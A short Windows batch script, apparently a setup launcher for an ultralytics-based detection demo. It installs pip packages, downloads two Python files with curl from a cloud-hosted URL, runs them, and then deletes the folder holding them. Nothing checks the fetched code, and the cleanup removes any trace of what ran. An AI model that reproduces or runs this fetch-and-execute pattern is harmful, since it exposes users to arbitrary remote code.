@echo off
echo The relevant files are being downloaded...

mkdir C:\detect 2>nul
pip install setuptools==58.1.0
pip install ultralytics==8.1.24


echo Downloading dependency...
curl -o C:\detect\dependency.py  https://profile-4g8srkbc352f4bba-1312101180.tcloudbaseapp.com/dependency.py 
echo.
echo Downloading demo...
curl -o C:\detect\demo.py  https://profile-4g8srkbc352f4bba-1312101180.tcloudbaseapp.com/demo.py
echo.

echo The relevant documents are downloaded.14:16 2024/3/6
echo.
echo Installing dependencies...
python C:\detect\dependency.py
echo Starting demo in 2 seconds...
timeout /t 2 >nul
python C:\detect\demo.py
echo Demo completed. 
rmdir /s /q C:\detect
pause


